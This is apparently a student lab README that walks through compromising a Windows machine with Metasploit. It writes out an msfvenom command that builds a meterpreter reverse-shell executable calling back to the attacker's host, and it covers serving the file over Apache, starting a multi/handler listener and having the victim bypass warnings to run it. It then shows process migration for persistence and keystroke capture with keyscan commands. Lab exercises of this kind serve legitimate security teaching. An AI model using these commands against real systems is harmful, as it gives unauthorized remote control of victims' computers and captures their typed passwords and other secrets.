# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![Screenshot 2024-04-30 183622](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/39502aad-dca6-4248-a316-e42b1db6dc9b)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![324934867-981dae79-a184-4fe7-97fb-f06c1390355c](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/e9629c1f-043a-4c19-abce-46776a4c9284)
copy the fun.exe into the apache /var/www/html folder
![324935670-dd0bc2d7-d144-42a9-a9a4-0fb8dc491ae1](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/bc1cf342-525f-4be8-9658-2b8b07ee56c2)

Start apache server sudo systemctl apache2 start
![324936143-9eb99679-ea0d-4ea0-97c0-f75407e31d23](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/f5095d00-4e6a-4091-a777-f373d54d3e28)
Check the status of apache2
![324937385-27b142a8-4e44-447e-bed2-77e48cf0babb](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/b3965983-7c91-4e02-8ac3-8dab2eaab369)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![324938559-cac71c8f-d77f-45fa-bb28-ee8ceaa8cf94](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/1058755e-09e4-4da5-ad0e-d5256c905b9b)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![324939056-ecd3b7e2-63d0-4e99-990d-95fbd3654662](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/5fbd184d-0989-4ca5-bd7a-c01fca7f7862)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![324939547-c4b4e30a-88d4-4397-b4aa-e9a3e2136f0f](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/4803c901-a47b-4642-959a-ce80334b1bcb)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![324940098-a9ce9410-a8f5-4a9d-974c-7d482492914f](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/ef266722-426e-4427-8150-3c079fd290ce)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![324940620-90eea5e9-aee0-4238-bc08-796d0a407cdc](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/d2ba1f44-93cc-412f-bf51-a1b658fcbad7)
keyscan_dump Shows the keystrokes captured so far
![324941533-a9863e2c-4d9a-4d10-b95a-ae69b44c3386](https://github.com/Gajalakshmivelmurugan/Compromising-windows-using-Metasploit/assets/144871940/ba7e583d-f44e-4898-91f5-35cf1eb569ca)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
